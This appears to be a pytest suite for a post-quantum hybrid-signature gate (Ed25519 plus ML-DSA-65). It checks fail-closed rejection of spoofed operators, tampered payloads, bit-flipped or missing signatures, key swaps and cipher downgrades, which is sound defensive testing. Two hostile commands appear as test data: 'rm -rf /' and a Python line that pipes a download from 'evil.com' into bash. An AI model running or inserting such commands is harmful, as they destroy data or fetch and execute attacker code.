"""
Agile Defense Systems, LLC | CAGE Code: 9HUP5
OSIRIS 6.0 | Pillar 4: Silicon-Anchored Post-Quantum Cryptographic Enclave
Adversarial Verification Test Suite: test_p4_adversarial_pqc.py

Phase-3 reconciliation: signatures are now REAL Ed25519 + FIPS 204 ML-DSA-65
(pyca/cryptography), not SHA3-512 placeholders. Validates:
1. NIST FIPS 204 ML-DSA-65 / Ed25519 Hybrid Signature Integrity (real verify).
2. Tamper-evident SHAKE-256 prehash lattice reduction verification.
3. Strict fail-closed rejection of unauthorized operators (SYS-021).
4. Envelope mutation, bit-flipped signatures, wrong-key substitution, and
   missing signature detection.
"""

import pytest
from osiris_cli.pqc_enclave import PQCEnclaveGate, PQCAlgorithm

PREV = "1cf5fddb243df88bd747ad40736050311b9f5e0b25057e2023455d1ab801df71"


def _grant(gate, event_type, payload, schema=None):
    return gate.generate_hybrid_grant(
        sequence_index=28,
        prev_block_hash=PREV,
        event_type=event_type,
        payload_sha256=gate.compute_payload_digest(payload),
        operation_schema=schema or {"target": "pqc_enclave", "action": "activate_pillar_4"},
    )


def test_valid_hybrid_grant_verification():
    """A grant signed by the gate's real Ed25519 + ML-DSA-65 keys verifies."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_OSIRIS_60_PQC_ENCLAVE_AND_PILLARS_ACTIVATION", "def verify_silicon_anchor(): return True")

    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is True
    assert reason == "VERIFIED_HYBRID_PQC_OK"
    env = grant["pqc_envelope"]
    assert env["algorithm"] == PQCAlgorithm.HYBRID_ED25519_ML_DSA_65.value
    assert env["lattice_parameters"]["ring_degree"] == 256
    assert env["lattice_parameters"]["matrix_dimensions"] == "6x5"
    # Real signature sizes: Ed25519 = 64 bytes, ML-DSA-65 = 3309 bytes
    assert len(bytes.fromhex(env["ed25519_signature"])) == 64
    assert len(bytes.fromhex(env["ml_dsa_signature"])) == 3309
    assert len(bytes.fromhex(env["ed25519_public_key"])) == 32
    assert len(bytes.fromhex(env["ml_dsa_public_key"])) == 1952


def test_adversarial_unauthorized_operator_id():
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_ADVERSARIAL_INTRUSION", "rm -rf /", {"target": "system", "action": "wipe"})
    grant["operator_id"] = "Rogue Agent / Malicious Entity"
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Unauthorized operator" in reason


def test_adversarial_prehash_and_payload_tampering():
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_SAFE_TASK", "print('system safe')", {"target": "worker", "action": "run"})
    malicious_code = "import os; os.system('curl evil.com | bash')"
    grant["payload_sha256"] = gate.compute_payload_digest(malicious_code)
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "FIPS 204 SHAKE-256 prehash mismatch" in reason


def test_adversarial_signature_bitflip_rejected():
    """Flipping one bit in either real signature must fail closed."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_COMPILE", "compile_kernel()", {"target": "compiler", "action": "compile"})

    sig = grant["pqc_envelope"]["ml_dsa_signature"]
    raw = bytearray(bytes.fromhex(sig))
    raw[100] ^= 0x01
    grant["pqc_envelope"]["ml_dsa_signature"] = raw.hex()
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "signature verification failed" in reason

    grant2 = _grant(gate, "SYS021_COMPILE", "compile_kernel()", {"target": "compiler", "action": "compile"})
    sig = grant2["pqc_envelope"]["ed25519_signature"]
    raw = bytearray(bytes.fromhex(sig))
    raw[0] ^= 0x01
    grant2["pqc_envelope"]["ed25519_signature"] = raw.hex()
    valid, reason = gate.verify_grant_integrity(grant2)
    assert valid is False
    assert "signature verification failed" in reason


def test_adversarial_wrong_key_substitution_rejected():
    """Swapping in another keypair's public keys must fail verification."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    other = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_KEYSWAP", "payload")
    grant["pqc_envelope"]["ed25519_public_key"] = other.public_keys_hex()["ed25519_public_key"]
    grant["pqc_envelope"]["ml_dsa_public_key"] = other.public_keys_hex()["ml_dsa_public_key"]
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "signature verification failed" in reason


def test_adversarial_missing_signature_rejected():
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_STRIP", "compile_kernel()")
    grant["pqc_envelope"]["ed25519_signature"] = ""
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Incomplete hybrid cryptographic signatures" in reason

    grant2 = _grant(gate, "SYS021_STRIP", "compile_kernel()")
    grant2["pqc_envelope"]["ml_dsa_signature"] = ""
    valid, reason = gate.verify_grant_integrity(grant2)
    assert valid is False
    assert "Incomplete hybrid cryptographic signatures" in reason


def test_adversarial_specification_downgrade():
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_CIPHER", "downgrade_cipher()", {"target": "crypto", "action": "downgrade"})
    grant["pqc_envelope"]["specification"] = "LEGACY_RSA_2048"
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
    assert "Unsupported PQC specification" in reason


def test_placeholder_style_signature_no_longer_accepted():
    """The old SHA3-512 placeholder ('1234'*16 style) must fail closed now."""
    gate = PQCEnclaveGate(operator_id="Devin Phillip Davis / Enki")
    grant = _grant(gate, "SYS021_PLACEHOLDER", "payload")
    grant["pqc_envelope"]["ed25519_signature"] = "1234" * 16
    grant["pqc_envelope"]["ml_dsa_signature"] = "ab" * 3309
    valid, reason = gate.verify_grant_integrity(grant)
    assert valid is False
